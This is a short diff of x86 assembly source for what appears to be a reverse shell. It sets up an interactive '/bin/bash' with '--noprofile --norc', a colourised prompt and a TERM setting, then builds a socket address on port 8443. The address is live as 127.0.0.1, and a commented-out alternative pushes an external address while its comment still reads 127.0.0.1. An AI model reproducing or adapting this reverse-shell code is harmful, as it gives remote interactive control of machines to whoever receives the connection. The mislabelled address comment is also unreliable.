@@ -4,11 +4,13 @@ section .data
 	wait_str db 10,"Wait 5 seconds...",0
 	wait_str_len equ $ - wait_str
 	shell db "/bin/bash",0
-	ps1 db 'PS1=fancy $ ',0
-	term db "TERM=xterm-color",0
+	ps1 db 'PS1=\e[0;31mf\e[0;32ma\e[0;33mn\e[0;34mc\e[0;35my\e[m \$',0
+	term db "TERM=xterm-256color",0
 	envs dd ps1,term,0
 	arg1 db "-i",0
-	args dd shell,arg1,0
+	arg2 db "--noprofile",0
+	arg3 db "--norc",0
+	args dd shell,arg2,arg3,arg1,0
 
 section .text
 
@@ -47,7 +49,8 @@ _start:
 	;       char        sa_data[14];
 	;       }
 	xor ecx, ecx
-	push 0x0100007f         ; s_addr = 127.0.0.1
+	;push 0x087cc94e         ; s_addr = 127.0.0.1
+	push 0x0100007f
 	push word 0xfb20        ; port = 8443
 	push word 0x2           ; family = AF_INET
 	mov esi, esp            ; save address of sockaddr struct
